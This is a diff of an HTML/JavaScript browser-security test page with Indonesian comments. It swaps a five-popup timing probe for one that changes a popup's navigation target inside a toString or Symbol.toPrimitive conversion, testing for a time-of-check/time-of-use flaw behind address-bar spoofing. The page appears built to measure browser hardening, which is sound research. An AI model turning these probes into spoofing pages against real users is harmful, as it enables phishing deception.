@@ -1,31 +1,32 @@
-<!-- 42 | W10  WAKTU EKSTREM - lima jangkar waktu yang berbeda, diukur satu per satu | [1-CLICK]
-     ASUMSI YANG DILANGGAR  "delay-nya wajar, jadi cukup diuji di satu titik waktu"
-     IDE  ini bukan satu eksploit, ini PETA. Primitif yang sama (buka jendela, tulis DOM,
-     mulai navigasi) ditembakkan dari LIMA jangkar waktu yang secara internal berbeda jauh:
-       0ms task · microtask · rAF tunggal · rAF ganda · rAF tripel
-     rAF ganda/tripel jatuh tepat di sekitar batas commit-render - titik yang hampir tak pernah
-     dipakai orang karena tidak intuitif, dan justru karena itu jarang di-harden.
-     Yang dicari: adakah SATU jangkar yang hasilnya berbeda dari empat lainnya. Itu jangkarnya.
-     Hasilnya kemungkinan besar ABU-ABU -> jangan disimpulkan, ukur pakai 50.html.
-     EXPECTED-SECURE  kelima jangkar berperilaku identik.  BOUNDED: 5 jendela, sekali jalan. -->
-<button onclick="go()">Run 42 (buka 5 jendela kecil)</button>
-<pre id=g style="font:12px/1.6 monospace"></pre>
+<!-- 42 | weird-lab W5 · tujuan navigasi yang BERUBAH selagi dibaca (jalur WebKit) | [1-CLICK]
+     ASUMSI YANG DILANGGAR  "membaca sebuah URL tidak punya efek samping"
+     location dan window.open menerima string. Beri objek, dan browser harus memanggil
+     toString/Symbol.toPrimitive dulu. Kita taruh efek samping DI DALAM konversi itu:
+     saat browser sedang menghitung "URL mana yang dituju", kita sudah memindahkannya.
+     Keputusan tujuan dan tindakan menuju terjadi pada state yang berbeda — TOCTOU di lapisan
+     konversi tipe, bukan di lapisan jaringan. Lapisan ini hampir tidak pernah diuji.
+     Dua bentuk konversi diuji terpisah karena jalur kodenya berbeda: toString biasa,
+     dan Symbol.toPrimitive yang lebih jarang di-handle.
+     YANG DIBACA  berapa kali konversi dipanggil, dan URL akhir yang tercetak di bar.
+     >1 panggilan = URL dibaca ulang setelah state berubah = jendela nyata.
+     EXPECTED-SECURE  konversi tepat sekali, di awal, dan navigasi kedua membatalkan yang pertama utuh. -->
+<button onclick="go('toString')">toString</button>
+<button onclick="go('primitive')">Symbol.toPrimitive</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
 g.textContent = 'REAL ORIGIN: ' + location.href;
-function shot(label, i) {
-  var w = window.open('', '', 'width=340,height=200,left=' + (30 + i * 350) + ',top=' + (60 + i * 40));
-  if (!w) return;
-  w.document.write('<div style="font:13px system-ui;padding:8px"><b>' + label + '</b><br>' + location.origin + '</div>');
-  w.location = 'https://www.google.com:82';
-}
-function go() {
-  setTimeout(function () { shot('0ms task', 0); }, 0);
-  Promise.resolve().then(function () { shot('microtask', 1); });
-  requestAnimationFrame(function () { shot('rAF x1', 2); });
-  requestAnimationFrame(function () { requestAnimationFrame(function () { shot('rAF x2', 3); }); });
-  requestAnimationFrame(function () { requestAnimationFrame(function () { requestAnimationFrame(function () { shot('rAF x3', 4); }); }); });
-  g.textContent = 'REAL ORIGIN: ' + location.origin +
-    '\n\nBaca omnibox KELIMA jendela. Catat mana yang berbeda dari yang lain.' +
-    '\nSatu jangkar menyimpang = itu jangkar yang belum di-harden.';
+function go(mode) {
+  var n = 0, w = window.open('', '', 'width=760,height=440');
+  if (!w) { g.textContent = 'popup diblokir.'; return; }
+  w.document.write('<div style="font:15px system-ui;padding:14px">tujuan dihitung sambil berpindah<br><small>' + location.origin + '</small></div>');
+  var hit = function () { n++; if (n === 1) { try { w.location = 'about:blank'; } catch (e) { } } return 'https://www.google.com/'; };
+  var obj = mode === 'toString' ? { toString: hit } : (function () { var o = {}; o[Symbol.toPrimitive] = hit; return o; })();
+  try { w.location = obj; } catch (e) { }
+  setTimeout(function () {
+    var v; try { v = w.location.href; } catch (e) { v = 'BLOCKED'; }
+    g.textContent = 'REAL ORIGIN: ' + location.origin + '\nmode: ' + mode +
+      '\nkonversi dipanggil: ' + n + ' kali' + '\nw.location.href   : ' + v +
+      '\n\n>1 = URL dibaca ulang setelah state berubah. Baca juga bar popup-nya.';
+  }, 1400);
 }
 </script>
